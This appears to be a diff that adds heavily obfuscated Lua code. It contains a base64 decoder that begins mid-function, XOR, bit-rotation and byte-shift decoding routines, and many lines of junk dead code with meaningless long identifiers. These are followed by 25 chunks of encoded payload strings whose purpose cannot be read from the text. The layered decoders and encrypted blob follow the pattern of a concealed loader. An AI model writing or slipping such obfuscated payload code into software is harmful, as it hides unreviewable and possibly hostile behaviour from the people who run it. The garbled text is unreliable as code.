+local m,o={},{}for i=1,#b do m[b:sub(i,i)]=i-1 end;m['=']=0
+local i=1;while i<=#d do
+local a,b,c,e=m[d:sub(i,i)]or 0,m[d:sub(i+1,i+1)]or 0,m[d:sub(i+2,i+2)]or 0,m[d:sub(i+3,i+3)]or 0
+local n=a*262144+b*4096+c*64+e
+o[#o+1]=O0_CDEFGHIJKLMNOPQRSTUVWXYZabcdefoXYZabcdefghijklmnopqrstuYZabcdefgRSTUVWXYZabc.char(GHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrTUVWXYZabcdefghijklmnVWXYZabZabcdefghiRSHIJKLMNOPQRSTUVWXYZ_LMNOPQRSTUVWXYZabcdefg.floor(n/65536)%256)
+if d:sub(i+2,i+2)~='='then o[#o+1]=O0_CDEFGHIJKLMNOPQRSTUVWXYZabcdefoXYZabcdefghijklmnopqrstuYZabcdefgRSTUVWXYZabc.char(GHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrTUVWXYZabcdefghijklmnVWXYZabZabcdefghiRSHIJKLMNOPQRSTUVWXYZ_LMNOPQRSTUVWXYZabcdefg.floor(n/256)%256)end
+if d:sub(i+3,i+3)~='='then o[#o+1]=O0_CDEFGHIJKLMNOPQRSTUVWXYZabcdefoXYZabcdefghijklmnopqrstuYZabcdefgRSTUVWXYZabc.char(n%256)end
+i=i+4 end
+return FGHIJKLMNOPQRSTUVWXYZabcdefghijuvwxyz_UVWXYZabcdefghijklmopqrstuvwxy1DEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrs.concat(o)end
+do _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=68 end
+do LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=72 end
+if LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ~=IIGHIJKLMNOI_XYZabcdefghi1 then else end
+while false do break end
+pcall(function()end)
+repeat until true
+do local _={21,18}end
+do I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ or 984 end
+pcall(function()end)
+if LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ then I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=85 end
+while false do break end
+local function _0nopqrstuvwxyKLMNOPQRSTUVWXYZabcdefghijPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_UVWXYZabcdefghijklmnopqrstuvwlmnopqrstu(d,k)
+local o={}for i=1,#d do
+o[#o+1]=O0_CDEFGHIJKLMNOPQRSTUVWXYZabcdefoXYZabcdefghijklmnopqrstuYZabcdefgRSTUVWXYZabc.char(_1_ABCDEFGHIJKLMNOPQR.bxor(d:byte(i),k))end
+return FGHIJKLMNOPQRSTUVWXYZabcdefghijuvwxyz_UVWXYZabcdefghijklmopqrstuvwxy1DEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrs.concat(o)end
+for _=3,4 do end
+do local _={19,55}end
+do _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx or 78 end
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx or 5 end
+repeat until true
+do IIGHIJKLMNOI_XYZabcdefghi1=96 end
+while false do break end
+do I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno or 71 end
+do local _={99,77}end
+do local _={17,32}end
+do local _={77,58}end
+do local _=648 end
+local function _IOCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstTUVWXYZabcdefghijklmnopqrstuvwO(d,s)
+local o={}for i=1,#d do
+local b=d:byte(i)
+o[#o+1]=O0_CDEFGHIJKLMNOPQRSTUVWXYZabcdefoXYZabcdefghijklmnopqrstuYZabcdefgRSTUVWXYZabc.char(_1_ABCDEFGHIJKLMNOPQR.bor(_1_ABCDEFGHIJKLMNOPQR.rshift(b,s),_1_ABCDEFGHIJKLMNOPQR.lshift(b,8-s)%256))end
+return FGHIJKLMNOPQRSTUVWXYZabcdefghijuvwxyz_UVWXYZabcdefghijklmopqrstuvwxy1DEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrs.concat(o)end
+do local _={35,74}end
+do local _={8,45}end
+if LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ~=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx then else end
+do LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx or 103 end
+do local _=725 end
+do I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=IIGHIJKLMNOI_XYZabcdefghi1 or 635 end
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ or 456 end
+while false do break end
+do local I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=701 end
+local function I1GHIJKLMHIJKLMNOPQRSTUVWXYZabcdFEFGHIJKEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy(d,k)
+local o={}for i=1,#d do
+o[#o+1]=O0_CDEFGHIJKLMNOPQRSTUVWXYZabcdefoXYZabcdefghijklmnopqrstuYZabcdefgRSTUVWXYZabc.char((d:byte(i)-k)%256)end
+return FGHIJKLMNOPQRSTUVWXYZabcdefghijuvwxyz_UVWXYZabcdefghijklmopqrstuvwxy1DEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrs.concat(o)end
+while false do break end
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx or 576 end
+while false do break end
+if LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ then _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=38 end
+pcall(function()end)
+while false do break end
+do LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=IIGHIJKLMNOI_XYZabcdefghi1 or 712 end
+do I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=9 end
+local _lGHIJKLMNOPQRST_0oabcd={}
+_lGHIJKLMNOPQRST_0oabcd[1]='0bPS/rvYvNHZ8uD+vOCz+8n6vPPj+e/MxNO/zMTqoLjJ477Dztrp5rrx58PfuMPTwt/m5qDv7tnJ7NL+4Onu7u+74NHh/NK+xO7S+8TT7tv9/+2g+eDRycH96cHC372++frSyb7l5b782szTv+3q5sTu56TM6Ofb7/jM2fjR5rmk+NLjw+DmzL7s6tnJ4urZ/fu8vrqkvrjt4b3z4bO947jsw8m57+7T4N7D2cnjvsz7/erb5tPNuO+g5vvu7eDu2OnmzN/56OO707zM5/Lm/fn96tm5787M/tnM5ee+s/7t5e7ZpOCyuO2/5dyy4efz//K9vrrl7tn5/NG54+WgzNrR7b7s0b++yeTm/sH9zu7Y3qD+5bi/zMn57sT5vaTB/NHSoMrqpMHh8s25'
+_lGHIJKLMNOPQRST_0oabcd[2]='zeDl2e246cz42sPB5/i/3MTa6f7H5KTj2u3NxO3+5v6y/eDczf7quMzo4NG72tLM5t7m4/LTvf668+Cg4+TSzOHyzNOk+ujJ7/7g7u/778Tlv6Dt5ePl09rR78Po6czZwu7q2fjR5v3y0b/Zvd6ypOWyv+bj487Z//i+oMH45rnfvujj5/Llvrr66My72dG557y+uPzRzv75vbPj7unS4//kv77g2s7c46Dq2dnhvsHjv9HD+fjM5vzS4OPj/+/b4NG8zOH+0tn+7b3RxNi9uf7TstvZ/7/7+NHq2cTu5eb66Om5pOSz3OLo5cz54L7E/eTDyfHszMGg2M3BuOXnufvyve7H5efbvOPqoOzY0aDO2b/M+bLpuf7S6aD9+87Z4OrD0frpvNHM78z7'
+_lGHIJKLMNOPQRST_0oabcd[3]='pPq9zMTR5cTa6rLJzf3lyeXy6dzl/ua+uv/nycP57dPu2sPMzeG9w83/5ebJ4+XT4Om9vtni5dzv+erD4t+9ubL7v/vk6OnZ+eLqzM7T6fv5pM7+uqTDvqDe0ubvpMy5+7Lu88Dv6Pv5v87c/uqk0f/ivP780bLB2trD2f7pzKCk7OrmyezRzLL5vLn5/+jm+u6+ybLj0bny7unE/tPt0cP7zcP80czJ/NG8ufvlv8zE7+7J47uyvrLs6czN+OrzvOLp0djtzqD74b7zv9nSycDa0uPZ+Mz++/zDoLne7u3fvOnm7//t3Lr75snj+c6g7bK8ufn46r7l482gzfq90e+/6vPtu9LM7NHque7qs8zJ7M7u7+TS2eLYzcTt+6TRv+3O+77kvcTa7eru'
+_lGHIJKLMNOPQRST_0oabcd[4]='uvvD4+W4zOO57+q5/fjDzPvzzbnu6sPRvv6+xLLgvcmy5ODj//vD5sHs6dPj+8zuuuLNxPHj6cHa6ODc2bLSyfzToPPy773DvOC9uMrYvL7D+ujm2/7D/uO40bng0unT4bLqw+zSvLm76u7jwf/R2/P+5v285efMu+i+29rtw9Gk5bLJyfvtvtvi0u66suXR7f3O+/zqsqDJ47zE8+zD4+O7pMzfu+a5/fjO5uX50szh4KDT5/ntwb766u742c7u2OjnzOP40aS92sPm+bik2drYvsGy+rzJ2fu/7tnz5cyz0r3J8/jg5sDqvaDx/tLRvd6/7tni0qDv++jjue7M7dv75dPhu+6g++C8/v+z6snN7NL78+TO3KDt0ubK78O+x/rRudns6tyk/uXu'
+_lGHIJKLMNOPQRST_0oabcd[5]='zt/npOLu5v742NLjwfu8xM3lw8n7+8zB8+DO2dn90fPt5b/m6N+9/fjYvaC64LK5w/nO7vm86cTH/cPTuP3DoL/v7uOk5c7uuvO/4/jYv+Pi2tLJ5/7SyeHzveXD483D7eXozN/g6cHts73T2bu/zOOz58Hl4+nT8/nlyfLToLm6vLzuxOjl0fvl78n94s3BoNjM077jv8zf/9HE8tnpwebRzNvA7c242unD873azsz/pL242bigzPP50tHi0erZ6O7O3Oe+zNu70uXu8/m9w+++w/7m3+bts9rRuc7azPvo6eqg+/Lq7aTkzaSk4Oag5ePMw8Tv4O7Y2ur7vPi+pLLgzr7l4KS+zf7m3OGz0bm/7uW+8fvp8/zR6e7H5M7J/ti+ufm+vObM0rzM'
+_lGHIJKLMNOPQRST_0oabcd[6]='5eDNyeHkoLn/v+jj5t7RuOTqs+7H+sz9/OjRpPn4vNnZ+6D7udHq5cnkoO3hpOrD/u6+vsnivf6+/+njw/rl2e7uvO7E0czz4tG8/uO/5ePk3qDm7ti8oP++0cm73s25zu680cHks/vy2Mzt/ePnuMH7zcG8+cygs+/q46De6f7Y6sygwfm93Lj7zMHu2dLR2ezq49ju5bnB4KS5x+TR8+XlzNnB/dLmu9npxMflzMPN+e7B+N+9+/u4oMO85O372O3D3OGk6v7voL/mvdnl3Lri58y85ObJ/eSkueX67fOy+8zuxOrSoLvezO3Z4uXJ/7u9/sHhvr7h8+XTsv7l/u3k6tni0uXjyeK93P7Y4Nmy+erlud6//qTk5u7O2urbxNLg2drT58zv+em+'
+_lGHIJKLMNOPQRST_0oabcd[7]='+6DmxKDY577/4ua54eG85vjo5r7x+8Og5Njq0cTZ6cm52NHD/7y+zMrY5ri84O65+/7MoOO/7bns0++g+O7DwfP/zOXO6qDl2bLD7t/h5sS6vMzcxO/u48Hg0szb++7Z+7jNye7u6f7n/r2g6NHM7srTzaT5/NLu/7+zycHg7v7o2Mz75t+85sDew8m92Mzm2+Dq8+ba6v7/ve6gvdPmvtnzvO6k5NHMytm9weG+oMnD5e7u47PpucDp5ua90u3B4Oq8ye/j4MzluKTz4aTgzL3e5bn66OW58f7S7u28w+bC2tL+zNLpoKDo6dO76L3Tsvi9xPPg5ubf+c7mwO7RuLnvzfO5373Du9nRzOf/5cT/u83z/7+8ybq4pLnM0b3R4+PlzKT4vbji2b3R'
+_lGHIJKLMNOPQRST_0oabcd[8]='8f3MxP365cGy/+7D7bzg3Pv9w8Hvs+b+oO7m28f50qDC07zR/OjNuNjSs/7Z+uru5/Hlwdm/0tyk+efb7bPM/fP66OPnsu3z3//M88P+vLn/+7PR+Onp8+fgvczZvdL+8ti+zLrj6ePZ+ejR5+K/0eX9zv6z6ujc37jlybnRvKCg0e3Z46Dl7r/qs+P9/s3z7+LD8/m8vrj62ea54+XNucLTsvP7+Oe+wf/Nw+G+5u652sO5w//M7czazaSz0s3b46C83OPi6f6z0b/m+u3g4+jp58nv++ju4eLq08DZvvPh7Om537LqoNrazbig6u3T7NnRzO/lvP755aTBxOnlvvmyztzf477z8/3l49jp7b7/7MPTyeTp/rL6zbjE3u792tKzvuX4zaThu+fb'
+_lGHIJKLMNOPQRST_0oabcd[9]='zNnRuf3s0tza2urm7fnS5u+46Nmk5NKg2uq8/v346tzM6ODm/7vtucH56r656u7M7f/vuaDtw7nY3+D+2/nRuejZzcOg37zzu+nm5f/7oMn7stLj/um/5uPl7b7t4s24u9PloP7azMPb+en76O/Svvn/7u3nuMzt77y989v/7vvz5Oj7zf6/7uTq5u7m7ubT/fugvsnkvcP/oOfJ+/vD3L7+zNm77szB/6C+ueXivsO6pL3+2b3DvuG7vL7tvs7mytPt0+e4pMnx5Oag4biz7uLp6tzC7cPMsuXnoOHjvdn7/ubTs9PM5e/gs9z5pMPm/6DO7rLgsszE2c7c7uqg7br40smk48zl+fvq3Mn90czi7s3Myfnp2cLSzszM2M7j3/PS7r76zcnu2Obc'
+_lGHIJKLMNOPQRST_0oabcd[10]='wtLg5uDT78Tv+u/bv9K+2779zv7l5O658ui8+/my6aDM7unc/7zu5cn458my5b3uv+i928njw8no0uDZ7NPMwe7azO6508y+suLO5uG/svPE2tLj7eLn8+/jzfPZvMPc4NLlufv4vMH+2url2t7S+/HkvdP67+654NPvucrfv+7f8s3D8t6gufuy4Mztvb/Zw+zD4+7YzNzZv+XB+/nM0+zozLnz+e3m7bvtvvH7w9Gy/c7u4/vg7vrvv+Pn++3mzezq07L6zNnnv6DmxO3q7e275e7C6LzM5u3nufzRw9Pt8ubj5OjMuc7S7sG6/sO55big4+jTzv780qDR4frmw/rY6tu85b255ezRuMn958PY0sPj8tG9+8TY5tP40+3+/eLmubqzzO3K3sPT'
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno or 444 end
+if IIGHIJKLMNOI_XYZabcdefghi1~=LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ then else end
+while false do break end
+_lGHIJKLMNOPQRST_0oabcd[11]='773vzPugw7ns0+3B5NLNpPLR0qCg2LzZ573M/e2+svPfvr3z4/q95ube7u6g3uqgpPvDzLrk0cHB+u7+v+nO0e7T5rnlvdKgu+jRpPrR4Pv788PMu9/noLnTzuPlvaDu/7PNpOHszu7a6e2+oNm9oLrl6tPa6u7JoNLu7d+/0u6y+ODJ3/Pm09v5v/vfpNLu7/Pg2bj7vcPm2ObJzNHg4+P67qC4/ue5weTO0ezqoObM6ee+yfnq7u7v5uPl+ebB4OjMw+G4s9zlu+XJ/NLl/vrTpNH54sP+/f3O++O40dv/vefD77jnzPmgw/P5+efD/urg++X77ub7+szB/f28oPjqw/Py6ubu//28weDp6vvZ89Hb2N7q89/4v8na0rK5+ePp5u3y5r77+ubM'
+_lGHIJKLMNOPQRST_0oabcd[12]='+eS8vv3/4NG97+DJzeWk4/zSvcPs0+bm8f6/5u29w77b5O3+yurqwbrx4OPY6ejJ+tLp5uPh4P7b4OblurjM28395tH80uXRu+/nw8rZ5cTh4MPM77Lg7sDp5sHu7+3j+trDvsLq7r7v/szE37Pp47jh5rjvvL2+5u7D7trY6u3z4eW+8eXm29jqzLm57szl4uq+uLvZzP66u+XmoO7nuLj+58P/u9LR2Ortuc7evb7o0sPmu+nt47PToLm6v+e4s+jm0crpvri6+dLJ4b3m2ezY0cP/8uq44u+8zMnizczE086g5NPRoP++pMHf+ujm7NHlxNm8zMHK2ODmuPrlzLnazLju3u7t5/ntzPnkoNHh+ee42NGz/rPp5qDnu6DRuuXRzOLR5rnz5M7+'
+_lGHIJKLMNOPQRST_0oabcd[13]='u9PMoLvq0u7jv7PuuvnO5uO4zNPN/ubZwN+95cn6v9HE7dG+8+Sg7bj5v/u96NLRw/3RpO34vcTj5e7T7/vl5sn778H80tLm5b/q5r/T6Ob5+77Bw+LpxN/9zNzo3uXE7eXl7v/6v+650dG55f/p4+fl77nY0eX77b2yvqDZ57i90aTTpOG/0cTov9HN5dHbpP3M06DuzOPu09HM+tjgoP/yzOP63u77/tLnzOLRvf3l+Oe4wtPp/v3lw9zhv+7JvvjM5efyvNOy+qC+w//D3L7j6vuz7dLM5bvm7f7T7v35u+bb/eS8uc7YvcHo2L3RyurO/sDv6tz7/MPM/ujNuO2/6v7Y6u3zve3g4+/67snN5eX75/7D4+bY58zb+uDj/6TO3OO9v+a8+ubD'
+_lGHIJKLMNOPQRST_0oabcd[14]='ur3OzOXizPvD+eXjxOqgwfm9srnZ8+eg8tHNoMzo56Tf4+rM3/7D/uXizaD55b3t+t7OyfLT5tPvvb39uOTnwd/k5u7+3r3Ew+DooOzTvMnn4+bux/7q3P+z5sn+6MzZ/Ojm2ePjvcS56OXE+bLpzMHkvcHs0ubJ7Njpucn+ve3Zv87cxNnRub3R7sH+0sP73//u0czq6MzlvuDu2fLM5fuk4Pvo6e++2b+9vsrfv8nM0qD7w+DqoN/h5uX+2OXJve3D/vH/6fPv5Obb377t5uLSoOPn5eq5oN/m++X+vdvfvuq42+PmyeG84P77s+bb++O92f/j5uWg0r3T5/jRuPrtvMH83+fb3/q84+TovPvs0rzus96g0+LY5rnt+6D94/2849/ivdG50c7m'
+_lGHIJKLMNOPQRST_0oabcd[15]='7u3mvsHj5f7Y6tLR7/nu0b746rjjuM7++frm8+G87rjjuO6g8/ug5e/6stvO6c2goOjM283j6u6k5dLR+bPNvtn46uP47+qg/+XvuLnevqTa2OnJ8f+9/uH9vaDo0+7B2/7Mvvra0v670s7m5OjOvuf6w8znv6DuuuCgzO+/7tvM6b37wO285rve58nh5Onu+unq+/n7s8n54M7Z+7O90ef/6dy777/JzNnmvvn6577//ry5x+XD5srSzu758urlsvjMucDu6ub5s+rB8+Pp47nv78zl/em5uOW/++je78n55OXE+bjt0e+90qDfu7z75f7S3OezvdzY3urb4ezMoP3jzP7E2LzE7Nm/vtrRpOba7eXRzOrlydm7sr7f7Orz5bzpucH578y84OnJ'
+_lGHIJKLMNOPQRST_0oabcd[16]='37Pg3OO44NHJ5czboNnD+/m75v3n4szc8ujqyfn45qDH+L24udjg5uXlvcy+5KDc8/vuwe7u5vO64tGk4NPNyaTg58n66OCgwtjq47r+57jy0b3mxOi8/u24v8njvO3+8/287vu7v+Pls+X+urLRzLPow6Cy/ebl4Oq93Nv5w9P66My4udG+udnk7ub5vL++2bjO2d/izKD678zE5bPp2f3kpMzE2cy57aTq277/7rjt4LLM8eTq0cn+vfPf8+WgzfuyzMzqssny3r39++XSoNvk5tv+2L/R+u690djqzObz+82kurjq0/jR7tPH48Pj4N/l/sP957763unu/6DRvv7Tvbj66OnB5NjpufrqoNzO6czDzOrNuL/t0vvs2L/7uvrM3O+4vsHH5cO5'
+_lGHIJKLMNOPQRST_0oabcd[17]='5u/q5vrRvf3C6u++8fqk7vLTvsP+77655/u92+zozNnx/tGk7bvvyeGzvrjjvaDtsuCg28H95fPA2L3B7/692/3lvePf+Oq56NPn27nS7vPm06TR2tjN2/rq5/Pv8ub72bPg4/35vLnh8uagzNPDufm+7sTg2c77/+Lg4//74Nz/s8zu+7Lgyf/kpPvh5Oeg8f7O+7PR7sPM3szm7Om+yb757f7u6e3JxOrn2/+y7cnnuKS+zNm8vvrq6cTN4OX72urOvsf4zr77v8zB8urqweX+0bjY6MPTvOXM2/jR6NH+6b2g5N7nuLvqvcm+/8PT7trM08Dp57jfsr7b7fu887j+zMzZ4NKg/frm+++k0dvjoL7E5u7g47774Nnk7+nJ2tPmxOTtv9zk7ufD'
+_lGHIJKLMNOPQRST_0oabcd[18]='/f/u88f76ebK0u7lvenR87qgvsTj5enM/tHM7rntvMzlu9LM8u3S0dn+vaDt4tGk7+TD7sn67cnl+ubB2fvO7sze5dz5uOnZ47y+vuX5zcHtpL6+zNm/zMHjvcnN4Ojjsvvovrj90fPl4O7uuvjM8+Px5sTC3+buurvqoODZvP6k/7zm+7jv2/LRpNnv4+Xu2b7NoPju0fPt4M7m4eDp2ef7zNz/uLPj+bPl++W/6dPl+eb74/vlyf/74MnM7dHbsuWzvue9vszk7c3b4/vNwaDv7uPs6OrRu9Lq3OW7vaDo7+b74Om85vrpzObs6czD2eS84/Hks+Og7+7tuOzp3OHiv6DZ4+rcyeS//sLp6tzo6rP+57juudra6uWz6bz7+O6/7sPl5tnvv8zz'
+_lGHIJKLMNOPQRST_0oabcd[19]='2tLo0dn9vsza09HJs+3l0fP4zLjj/86g+um80+G857n5+Mz+yt7qzOWyzaDx+r/u2+Tq2eTuveblvsPEwNPozMDq4KDhvM7u+b295qT4vPPH+b7B2/nM7v345dni2c258eLl2e+7w7nf4bzm8+O/0fLf5rjY7r7M2+PqydrSzvvM0efz5Oi9uOe+zObx+u7jwNnR2/vk78Hm2OncwfjD2e+9oP75suXT5/i8oO++56C44+fb+t7p08Hk6L7h/M2ksvug29jSsqC52L3E/fu84+2k0vvh/r/u7/rNw835v8zj/NLm+bvqwejt0dvz4O/B57u+oM366u3g3r/Jx+C/zPvl6vvn+u7JvOCgoPrazL7tvqDm36S8oMDo4Ob74+rm6O2+ydmz6eOy+83b'
+_lGHIJKLMNOPQRST_0oabcd[20]='vv/pyd++oMy6s+nB5NOk5sf4v76y4L6+/O3NweTo5fPfuMy54fLD0eW+zLnv+MzR/f29+8n+vf746Ly+7/PM0fv+5sHo2tGk4N7nzPjY5rn67uag7eLp+8H/6aDE2OnT+eC92+39vebO3+Du4fzRxOWz5sHJ/7yg5eHm8+zS6u3x+eDmw/3qw7vtw9nY2tGk+/rv8+jv0b6/6NLZ8trMzLvTvbn75eDMvv/Mucfs6sz7vsPm7u+8oLr6vMHa7c7m5u/M4+Tu0cHn/szz2NLD4+2kvMz7/+fMsuPN8/razczx7NG5/73M4/H75tPb5MzM/7vq7b7jw9nH4ebtsv/g2eDa6cHK0sP7yf3lufrpw+Ok5NGg4b3NzNrf4MzN4KDJyezq3L/o5cHs2enM'
+pcall(function()end)
+pcall(function()end)
+while false do break end
+_lGHIJKLMNOPQRST_0oabcd[21]='+7LOzPH90u7g7r3ZuuK80bLg0sm+5byg/fq9vvP60vu50c7c5+Tl877k5bn//sPJ7frNvrr40ty72czJ6N6koPPizNu87My557vo/r755dzt+Onuv+ro2b3uzL7n4Lyg7eXq48fl0uak+8PM///S5qDtzNG8+7PjuOzS/tn95czJ4L/R57O92+Ph5aDj+8zmx//D09n4zvvH+dLcuP3S3OOz5vuz6L/u/fro2fnx5qDY0b7zweDDye3jw+b//tL+ue29yczo6rnm6b2+2+XM7u7T0fPD5c2+8/qg49vk6v367b6kpPnNzKT6v76937/MpP3q5bvt0u79+enjwO/q07z96v3N/uq+u9rOvujp7czB/8y5v97p+87v57jjvb6gyu3OzODq6Mnl+qDE'
+_lGHIJKLMNOPQRST_0oabcd[22]='x//vw9rt6cTB/r/j8eW85v3l6aD74bzT+bzq0c7uzuPo0eb9vOPRyfvl6O7+6M7M5tLnpO/k57mz6eX+4/vO++Hiw7nB/b3J7O3qoObR78H74L/ZuvPpxLvSzP7y3ub94/3p0f/46snf4+rJ3+K+uMPszP7B4M257ePRzLj6vtv5+ODZ77jtybnu0cHk6MPzwOjm0eTt0bjx5bzc2bzO/r3q6cz74Obb++Tq0+/yvb7h+tHDyeTpvr7/zcHv8r/M77ju2eLtvNz/887j2b2g/vLezNHlsr3b56C90e//w+7o3unT2Oru/cf6pMza2tG+s+i/++je5e7s2OrJu+np47q/oMS++73Tv+/n28TS78nH+uXu7+LqoODSvLnY0c3Bv9+9uOzo6cT5vu++'
+_lGHIJKLMNOPQRST_0oabcd[23]='wfnS++PkzNPK2uq+5bjl/vrozszx7M7MzeDMoOP/5e6++c2kurPmoLnYzNPt+u3u/ui87sH70cHtvNLcsvvNuOPl0snO7r3+s9Lm47PRvtvo0ufz5N6yzMfiv8m++enjsuK9yeHzw8nJ4szjzuqgyf366Mnx/rzE/+TloOLR0dvg7unB2urmvuXz0uPY0tHbvuHmzOzo56Dy7ufzoOjg7u/gv9H80++4x+S98/3+w8S++efD7+PSvr7gzL742ur72fLNvqTjw8Ttv+65/+Dm3PrfvO7C07/j+Oq9xNm7s/vC6rLB2NPm3MTu5sT7s+DZ+aDM5sn556D5/+rMv9Puufv/vfO56sP7/fjp4+Lp7cy/0rzc+NHvxM377cH86qT+2u295r/a0tztu7K5'
+_lGHIJKLMNOPQRST_0oabcd[24]='+frt/vvj5cG6/8zu5u7g3Nvi5vPE7+2gvdHmvu247sP54+fM7ezp7rzlvNm+4+ag5/K9w+3+vsmz0efJudHl887vvdvv4sPE4NLg7ue40qC+/+rB//zp4+X/zdv7uO7+udLDxMzo6e762ODj5/nuwfPl6L7lvu7+wfnM7c35vNPK7czc7uno2fns0tGy++Dj6N6kweP559vH5bLzoN7R87L7zszj8+r94/i/oPnh5sTg2OblztG+zLvY0uPv8+nj4aDSvvH6zMnC79LjuODnpPH9zOPC7+n++bjt+7vp7sP9+erEvPrl4//s0qD80erZ8fm+2/LSoNvg0u377f3m09v+vqDj8uXcw+DD4/H96snt+824vdLSoOP/78H55c2577vM7b3u6qDB5er+'
+_lGHIJKLMNOPQRST_0oabcd[25]='4/qyvt/+4My6v+3Z5u/S2e+9w+7H/+2gpP+/vuLv7vP47r3ZyurM3Pm9zNz7pL7B//Pl8+Xhv9z7oL/j/t7tybr66szh8sz9/Ni9vrLgv+ag7r7Dsv/u/vLo0fPtu+DR3/m9uODv7aC/06Tm7+DlxP3+w8HvoOe+urLqw/jT7ebJ+qTJ7/O/+/7ozr7K7czz+frO7sDTs9nf+rLJoOnN8+O/zubj4877pOTmw+Tpvrjo07PRytnpuc3jvKD/+OXM5//MwcH658G50uDM4bu8+77kv+bk6c7m4b7p0++y7f777Mzm+Oi/0bPvw/vjvsygv+jMubL9vL7z4b/M8/rtxOfs6uPju+7Zx+DM5bPZw8Hv4MzB7ujNwf+g6vPt/+7l/eHlzNm+w7nfvOr7'
